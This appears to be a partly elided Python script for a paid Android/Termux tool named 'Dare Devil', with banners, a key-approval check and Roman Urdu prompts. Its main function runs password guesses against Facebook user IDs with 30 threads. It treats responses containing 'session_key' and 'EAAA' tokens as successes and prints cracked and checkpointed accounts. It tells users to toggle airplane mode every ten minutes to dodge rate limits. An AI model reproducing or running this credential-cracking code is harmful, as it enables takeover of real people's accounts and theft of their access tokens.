...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Dare Devil\x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 

 ───────────────────────────────────────────────────────×

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Dare Devil \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/DareDevil779 \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook.com/Huznain.khan3\x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/daredevil78/paid.txt/blob/main/paid.txt"])

	#yahan apni facebook id link dalna

	exit(" [=>] YOUTUBE : https://youtube.com/channel/UCrQy3EjkJqLbsv8d34v46Mg")
...
def notice():
	...
	os.system('am start https://wa.me/+923135251189?text=' )

	runtxt("\033[0;97m Key Approval Ke Liya Msg Krain >> %s%s"%(G,basesplit))

	runtxt("\033[0;97m Key Paid Mila Ge So Time Waster Block")

	time.sleep(5)

	os.system("xdg-open https://youtube.com/channel/UCrQy3EjkJqLbsv8d34v46Mg")

	subprocess.check_output(["am", "start", "https://wa.me/+923135251189?text="])
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/daredevil78/paid.txt/blob/main/paid.txt').text
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41Dare Devil\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/daredevil78 \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./Huznain.khan3\x1b[0m\x1b[1;97m]
...
───────────────────────────────────────────────────────× 
    ...
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCrQy3EjkJqLbsv8d34v46Mg"])
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\033[0;92m[=×>]\033[0;92m NOTE : HARR 10 MIN BAD AIRPLANE MODE/FLIGHT MOD ON KRNA MUST HA ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [DEVIL-OK=>] %s | %s\033[0;97m         "%(uid, pw))
				...
				print("\r  \033[0;92m   [DEVIL-CP=>] %s | %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	...
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  Huznain nd Saad\n")

		print(" [ Sosial Medi  ] \n")

		print(" [*] Facebook  : https://facebook.com/Huznain.khan3")

		print(" [*] Instagram : https://instagram.com/huznainkhan78 ")

		print(" [*] YouTube   : https://youtube.com/channel/UCrQy3EjkJqLbsv8d34v46Mg/ ")

		exit(" [*] GitHub    : https://github.com/daredevil78 ")
